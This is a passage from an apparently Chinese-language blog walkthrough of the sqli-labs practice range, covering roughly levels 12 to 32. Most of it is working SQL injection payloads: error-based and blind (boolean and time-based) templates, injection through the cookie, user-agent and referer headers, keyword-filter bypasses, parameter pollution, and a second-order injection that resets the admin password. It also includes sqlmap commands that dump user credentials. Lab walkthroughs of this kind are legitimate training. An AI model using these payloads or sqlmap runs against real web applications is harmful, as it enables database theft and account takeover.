table_name=\u0026#39;uagents\u0026#39; limit 3,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段 uname=-1\u0026#34;) or updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\u0026amp;passwd=admin\u0026amp;submit=Submit 用floor()函数进行爆破 1 2 3 4 5 6 7 8 9 10 11 12 13 14 爆破数据库 uname=-1\u0026#34;) union select count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破数据表 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段表 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select column_name from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit 爆破字段 uname=-1\u0026#34;) union select count(*),concat(0x7e,(select username from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x--+\u0026amp;passwd=admin\u0026amp;submit=Submit less13 闭合方式改成‘），和less12一样\nless14 闭合方式改成\u0026quot;,和less12一样\nless15 通过图片回显闭合方式为单引号闭合\n正确的数据与错误数据页面回显的图片不一样，可以尝试一下布尔盲注\n1 uname=admin\u0026#39; and length(database())\u0026gt;=8--+\u0026amp;passwd=admin\u0026amp;submit=Submit 不猜了，直接sqlmap\nsqlmap梭less15 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --current-db 全选yes，直接爆破出时间盲注。\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-15/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump less16 闭合改为\u0026quot;),和less15一样\nless17 注入点变为密码的地方\nsqlmap梭less17 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt -p \u0026#34;passwd\u0026#34; -D security --dump less18 网页记录了本地ip的信息，说明可能是数据库记录了本机的信息，即后台获取了一些诸如Ip的信息保存到数据库中，并且页面返回了数据包user-agent的信息，那么在请求头中就可能存在注入点\n看源码\n源代码标识获取浏览器信息，即user-Agent部分，表示客户端通过什么浏览器向后台请求\n在后面的请求中也有将该部分进行存储添加到数据库，现在就可以通过一些手段在数据添加的同时进行注入\npayload改bp中uers-agent部分\n1 \u0026#39;and updatexml(1,concat(0x7e,database(),0x7e),1),1,1)# sqlmap头部注入 在头部注入爆破中，sqlmap需要提高扫描等级 level和risk\n1 2 3 level x(x为1-5) 当为2时会对头部的cookie进行扫描注入尝试，x\u0026gt;=3时队user-Agent,ip,referer 参数进行扫描 risk x(x 1-3) 1时进行大部分扫描 2会增加基于事件的测试语句 3会增加or语句的sql注入 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --level=3 --current-db 或者指定头部爆破\n1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --user-agent=\u0026#34;*\u0026#34; --thread=10 --dbs 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security --tables 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-18/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; -D security -T users --dump 或者将数据包保存下来\n加上*号\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=4 -D security -T users --dump less19 这次改referer\nsqlmap直接梭\n1 2 python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; --thread=10 --dbs python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-19/ --data=\u0026#34;uname=admin\u0026amp;passwd=admin\u0026#34; --referer=\u0026#34;*\u0026#34; -D security -T users --dump 或者数据包保存下来在referer后加*号\nless20 登入界面有明显提示，cookie注入\n知道字段数可以用floor函数进行报错注入\n1 2 爆破数据库名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 爆破表名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (table_name)from information_schema.tables where table_schema=database() limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 爆破字段名 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select (column_name)from information_schema.columns where table_name=\u0026#39;users\u0026#39; limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# 1 2 3 4 爆破字段内容 Cookie: uname=admin\u0026#39; union select 1,count(*),concat(0x7e,(select username/password from users limit 0,1),0x7e,floor(rand(0)*2))x from information_schema.tables group by x# sqlmap进行cookie注入 cookie注入时用level=2,在cookie后加*;\n1 2 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 -D security -T users --dump less21 登入进去发现cookie被加密了\n1 2 admin\u0026#39; and 1=1 order by 4# YWRtaW4nIGFuZCAxPTEgb3JkZXIgYnkgNCM= 看回显闭合方式是')\n报错注入\n1 2 3 4 admin\u0026#39;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)# base64加密 YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdl KSwxKSM= 后面跟前面一样爆破\nsqlmap进行加密注入 对进行加密注入的数据需要用到tamper模块\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; --current-db 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; -D security -T users --dump less22 闭合方式改为\u0026rsquo;\u0026rsquo;,其他跟less21一样\nless23 字符型注入但是注释符被过滤了\n#和\u0026ndash;+都被替换成空字符\n只有想方法将闭合符号消耗完毕，让后台能够接收，处理掉原有的闭合方式\n1 2 3 id=-1\u0026#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1 这样构造闭合的目的就是将原有单引号进行逃逸使查询语句变为 id=\u0026#39;-1\u0026#39; xxx and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; 最后的半个 单引号用于逃逸后台的闭合方式 sqlmap运用 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/sqli-labs/Less-23/?id=1 --batch -D security -T users --dump 无脑梭\nless24 二次注入 二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入\n到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，\n当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。简言之就是将\n脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，当下一次调用该数据时，该数据就会\n拼接到其他查询语句中造成注入。\n注册新账号，并登入\n修改密码,修改功能语句为\n1 UPDATE users SET passwd=\u0026#34;New_Pass\u0026#34; WHERE users=\u0026#39;admin\u0026#39; 因为\u0026rsquo;和后面的引号闭合，而#又把语句注释了，所以在这里修改密码就相当于在修改admin的密码，这时候我们就是在进行越权改变管理员的密码，从数据库中抽出我们注册的新账户，用该账户越权修改\n管理员的密码\n修改为1234\n登入admin账号\nless25 and和or都被过滤了\n解决思路将or变成oorr,这样后台过滤了or还剩下or或者用||代替or(and一样的方式)\n1 2 3 4 爆破数据库名 ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 或者 ?id=-1\u0026#39; || updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 1 2 3 4 爆破数据表 ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() ),0x7e),1)--+ 注意：information中也有or需要进行双写 后面都一样\nless25a 发现与Less25的区别是数字型注入\n联合注入\n1 2 3 4 5 6 7 8 9 查询数据表 ?id=-1 union select 1,database(),group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() --+ 查询字段名 ?id=-1 union select 1,database(),group_concat(column_name)from infoorrmation_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 查users id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd))from security.users--+ less26 发现and，空格，注释都没有了\n\\s过滤了空格和换行，解决and or可以双写或者用\u0026amp;\u0026amp;和||代替，解决注释需要强行\n闭合逃逸，需要空格的地方可以加上括号，白盒测试发现注入类型为字符型\n1 2 3 and or ——\u0026gt; \u0026amp;\u0026amp; || # -- ——\u0026gt; 闭合逃逸 /s ——\u0026gt; 括号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 payload ?id=-1\u0026#39;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破数据表 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_sc hema=database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破字段名 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_ name=\u0026#39;users\u0026#39;)),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破字段内容 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(concat_ws(username,0x3a,passwoorrd)))from(security.users)), 0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 less26a less26a过滤的东西与less26一致，通过测试发现闭合方式还是为单引号,并且没有报错的回显\n尝试盲注\n通过布尔盲注可以逐一猜解爆破\n盲注的板子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 盲注 ?id=1\u0026#39;and length((select database()))\u0026gt;9--+ #大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ #substr(\u0026#34;78909\u0026#34;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。 ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ 判断所有表名字符长度。 ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ 逐一判断表名 ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ 判断所有字段名的长度 ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ 逐一判断字段名。 ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ 判断字段内容长度 ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ 逐一检测内容。 时间盲注9 ?id=1\u0026#39; and if(1=1,sleep(5),1)--+ 判断参数构造。 ?id=1\u0026#39;and if(length((select database()))\u0026gt;9,sleep(5),1)--+ 判断数据库名长度 ?id=1\u0026#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+ 逐一判断数据库字符 ?id=1\u0026#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13,sleep(5),1)--+ 判断所有表名长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断表名 ?id=1\u0026#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20,sleep(5),1)--+ 判断所有字段名的长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断字段名。 ?id=1\u0026#39; and if(length((select group_concat(username,password) from users))\u0026gt;109,sleep(5),1)--+ 判断字段内容长度 ?id=1\u0026#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50,sleep(5),1)--+ 逐一检测内容。 less27 直接看源码\nselect,union这类关键词只过滤完全大写或者完全小写，针对php这种弱类型语言，可以采用部分大写\n部分小写绕过\n1 空格，换行——\u0026gt; %0a payload\n1 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 1 2 爆破数据表 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,(selEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a1,1),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 重写绕过\n1 2 3 4 5 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;security\u0026#39;))),1))or\u0026#39;0 爆表 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema=\u0026#39;security\u0026#39;and(table_name=\u0026#39;users\u0026#39;)))),1))or\u0026#39;0 爆字段 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or\u0026#39;0 爆密码账户 less27a 闭合方式改为\u0026quot;,其他和less27一样\nless28 查看源码\nunion select被匹配了，解决的办法就是绕过union select 即可，测试发现没有报错回显，闭合方式为')\n盲注\npayload(x是要猜的值)\n1 ?id=1\u0026#39;)and(length(database()))=x%0aand(\u0026#39;1\u0026#39;)=(\u0026#39;1 less28a 通过源码发现仅仅匹配了union select组合，其余都未匹配，与Less28一样，用盲注的方式\npayload\n1 ?id=1\u0026#39;) and length(database())=8--+ less29 HTTP参数污染\n1 2 3 4 服务器端有两个部分：第一部分是tomcat为引擎的jsp型服务器，第二部分是apache为引擎的php服务 器，真正提供web服务的是php服务器，往往在tomcat的服务器处做过滤处理，功能类似于waf，由于 解析参数的机制不同，我们可以利用该原理绕过waf的检测；数据解析的顺序：tomcat从前往后， apache从后往前。 此关的通关简单联合查询即可，目的是了解参数污染的原理\npayload\n1 2 ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;)--+ ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select concat_ws(username,0x7e,password)from security.users limit 0,1)--+ less30 与Less29的区别为闭合方式为双引号\nless31 与Less29的区别为闭合方式为双引号加括号\nless32 ","date":"2024-09-07T00:00:00Z","image":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1.png","permalink":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","title":"sqli-labs靶场练习"}]